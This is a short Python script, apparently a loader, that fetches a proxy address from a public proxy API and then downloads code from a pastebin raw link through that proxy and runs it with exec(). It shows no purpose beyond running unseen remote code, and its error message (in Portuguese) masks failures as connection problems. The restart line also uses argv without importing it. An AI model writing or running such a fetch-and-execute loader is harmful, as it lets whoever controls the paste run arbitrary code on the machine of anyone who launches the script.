from os import execl; from sys import executable; from os import system
try: from requests import get
except: system('python3 -m pip install --upgrade pip && pip3 install requests');execl(executable, executable, *argv)
try: api=get('http://pubproxy.com/api/proxy').json();ip=api['data'][0]['ip']+':'+api['data'][0]['port'];exec(get(url='https://pastebin.com/raw/WY6AQRKa', proxies={'http': ip}).text)
except Exception as error: system('cls');system('clear');print('Verifique sua conexão a internet!' +str(error))
